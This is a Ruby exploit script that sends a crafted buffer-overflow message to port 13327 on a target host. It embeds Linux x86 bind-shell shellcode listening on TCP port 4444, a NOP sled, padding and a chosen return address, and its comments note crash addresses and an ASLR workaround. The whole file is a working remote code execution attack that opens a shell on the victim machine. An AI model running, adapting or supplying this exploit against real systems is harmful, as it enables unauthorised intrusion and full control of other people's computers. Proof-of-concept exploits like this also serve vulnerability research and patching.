require 'socket'

host = ARGV[0]

#linux bindshell tcp port 4444
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

#eip = "\x44\x45\x46\x47"
#we actually crash the app with SIGILL at 0xb7daeb2a when doing the stuff below
#for a static eip redirect, use 0xb7dadad6
#eip = "\xd6\xda\xda\xb7" #backwards for little endian
#objdump shows 0x08136c2f (among others) as usable instead of static redirect to avoid aslr
eip = "\x2f\x6c\x13\x08"
crash = "\x90" * 200
crash += shellcode
crash += "\x43" * 4090
crash += eip

crash += "\x43" * 7

buffer = "\x11(setup sound #{crash}\x90\x00#"

Socket.tcp(host, 13327) do |s|
    puts "[*] Sending evil buffer to host #{host}"
    msg, _ = s.recvfrom 1024
    puts msg
    s.sendmsg buffer
end

print '[*] Payload sent'
